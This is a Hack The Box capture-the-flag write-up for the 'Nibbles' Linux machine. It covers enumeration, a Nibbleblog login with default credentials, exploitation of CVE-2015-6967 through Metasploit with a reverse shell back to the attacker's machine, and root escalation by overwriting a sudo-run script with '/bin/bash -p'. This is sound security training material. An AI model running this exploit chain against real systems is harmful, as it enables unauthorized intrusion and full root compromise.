# HTB Write-Up: Nibbles

<<<<<<< Updated upstream
=======

>>>>>>> Stashed changes
---

| Field      | Details                                                      |
|------------|--------------------------------------------------------------|
| 🖥️ Platform | [Hack The Box](https://app.hackthebox.com/machines/Nibbles) |
| ⚡ Difficulty | Easy                                                       |
| 🐧 OS       | Linux                                                        |
| ✍️ Author   | samurai                                                       |
| 📅 Date     | April 20, 2026                                               |

---

## 📋 Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Summary](#summary)

---

## Overview

**Nibbles** is an easy-difficulty Linux machine on Hack The Box. The attack path involves enumerating a web server to discover a hidden Nibbleblog CMS installation, identifying its version, authenticating with default credentials, and exploiting an authenticated file upload vulnerability (CVE-2015-6967) to obtain a reverse shell. Privilege escalation is achieved by abusing a writable shell script that the low-privileged user can execute with `sudo` as root.

**Key techniques covered:**
- Port scanning with RustScan / Nmap
- Web content discovery with Feroxbuster
- CMS version fingerprinting via exposed README
- Credential guessing using default passwords
- Metasploit exploitation of Nibbleblog File Upload (CVE-2015-6967)
- Sudo misconfiguration abuse for privilege escalation

---

## Reconnaissance

### Port Scanning

Initial reconnaissance was performed using **RustScan** to quickly identify open ports, followed by a detailed **Nmap** service scan.

```bash
rustscan -a 10.129.23.143 -- -A -oN nmap.out
```

> **Note:** The initial RustScan ping scan reported the host as down due to ICMP blocking. Running Nmap directly with `-Pn` (or specifying ports explicitly) bypassed this.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### Findings

| Port | Protocol | Service | Version |
|------|----------|---------|---------|
| 22   | TCP      | SSH     | OpenSSH 7.2p2 |
| 80   | TCP      | HTTP    | Apache 2.4.18 |

Two attack surfaces were identified: an SSH service and a web server. We proceed to enumerate the web application.

---

## Web Enumeration

### Manual Inspection

A `curl` request to the web root revealed a minimal "Hello world!" page. Crucially, inspecting the raw HTTP response exposed a **hidden comment** in the HTML source disclosing a directory path:

```bash
curl -v http://10.129.23.143
```

```html
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

> 💡 **Key Finding:** The HTML comment reveals the `/nibbleblog/` directory and confirms the presence of the **Nibbleblog CMS**.

### Directory Brute-Forcing

With the CMS path confirmed, **Feroxbuster** was used to recursively enumerate content under `/nibbleblog/`:

```bash
feroxbuster --url http://10.129.23.143/nibbleblog \
  --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  --threads 50 \
  --depth 4 \
  --extract-links
```

**Notable results:**

| Status | URL |
|--------|-----|
| 200    | `/nibbleblog/content/private/users.xml` |
| 200    | `/nibbleblog/content/private/config.xml` |
| 200    | `/nibbleblog/content/private/notifications.xml` |
| 200    | `/nibbleblog/content/private/shadow.php` |
| 200    | `/nibbleblog/content/private/keys.php` |

### Credential Discovery

Accessing `users.xml` exposed a **username** but no password hash:

```
http://10.129.23.143/nibbleblog/content/private/users.xml
```

Research into Nibbleblog default credentials revealed that the default admin password is often set to `nibbles`. This credential was successfully tested against the admin login panel at `/nibbleblog/admin.php`.

```
Username: admin
Password: nibbles  ✅
```

### Version Fingerprinting

The publicly accessible `README` file disclosed the exact CMS version:

```bash
curl http://10.129.23.143/nibbleblog/README
```

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

> ⚠️ **Vulnerability Identified:** Nibbleblog v4.0.3 is affected by an **authenticated arbitrary file upload** vulnerability (CVE-2015-6967), which allows an authenticated attacker to upload and execute malicious PHP files via the My Image plugin.

---

## Exploitation

### CVE-2015-6967 — Nibbleblog File Upload

**Metasploit** includes a ready-made module for this vulnerability:

```
exploit/multi/http/nibbleblog_file_upload
```

Search and configure the module:

```bash
msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability

msf6 > use 0
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.23.143
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST <your_tun0_ip>
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > run
```

**Result:**

```
[*] Started reverse TCP handler on 10.10.15.33:4444
[*] Sending stage (41224 bytes) to 10.129.23.143
[+] Deleted image.php
[*] Meterpreter session 9 opened (10.10.15.33:4444 -> 10.129.23.143:48344)

meterpreter >
```

✅ **Initial access obtained as user `nibbler`.** The user flag can be retrieved from `/home/nibbler/user.txt`.

---

## Privilege Escalation

### Sudo Misconfiguration

After obtaining a shell, `sudo -l` was run to check for misconfigured sudo permissions:

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
```

```
User nibbler may run the following commands on Nibbles:
  (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

> 💡 **Key Finding:** The user `nibbler` can run `/home/nibbler/personal/stuff/monitor.sh` as root **without a password**.

### Investigating the Script

The `personal/` directory was delivered as a zip archive:

```bash
nibbler@Nibbles:/home/nibbler$ ls
personal.zip  user.txt

nibbler@Nibbles:/home/nibbler$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

Since `nibbler` owns the file, it has **full write access** to `monitor.sh`, allowing arbitrary command injection.

### Exploitation

The script was overwritten with a bash payload to spawn a root shell:

```bash
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo '/bin/bash -p' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
```

The script was then executed via `sudo`:

```bash
sudo -u root /home/nibbler/personal/stuff/monitor.sh
```

```
root@Nibbles:/home/nibbler# id
uid=0(root) gid=0(root) groups=0(root)
```

✅ **Privilege escalation successful.** Root flag available at `/root/root.txt`.

---

## Summary

| Phase               | Technique                          | Result                         |
|---------------------|------------------------------------|--------------------------------|
| Reconnaissance      | Nmap / RustScan port scan          | Ports 22, 80 identified        |
| Web Enumeration     | curl + Feroxbuster                 | Nibbleblog v4.0.3 discovered   |
| Credential Access   | Default password (`nibbles`)       | Admin panel access gained      |
| Exploitation        | CVE-2015-6967 (file upload RCE)    | Shell as `nibbler`             |
| Privilege Escalation| Writable sudo script               | Shell as `root`                |

### Lessons Learned

- **Never expose CMS README files** — version disclosure enables targeted exploitation.
- **Change default credentials** immediately upon deployment.
- **Restrict sudo permissions** to immutable binaries only; never grant sudo access to user-owned writable scripts.
- **Avoid storing sensitive directory paths** in HTML comments.

---

*Write-up by **samurai** | Hack The Box — Nibbles | April 20, 2026*
